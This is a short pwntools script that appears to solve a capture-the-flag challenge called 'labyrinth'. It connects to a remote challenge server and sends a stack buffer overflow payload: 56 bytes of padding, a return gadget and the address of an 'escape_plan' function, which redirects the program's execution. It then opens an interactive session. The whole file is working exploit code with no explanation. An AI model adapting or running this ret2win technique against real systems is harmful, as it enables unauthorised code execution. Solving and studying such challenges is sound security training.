from pwn import *

exe = ELF('./labyrinth')
#io = exe.process()
#gdb.attach(io, api=True)
io = remote('165.232.98.11', 32625)
io.recvuntil(b'\n>> ')
io.sendline(b'69')
io.recvuntil(b'\n>> ')
payload = b'a'*56 + p64(0x401602) + p64(exe.sym['escape_plan'])
print(hex(exe.sym['escape_plan']))
io.sendline(payload)

io.interactive()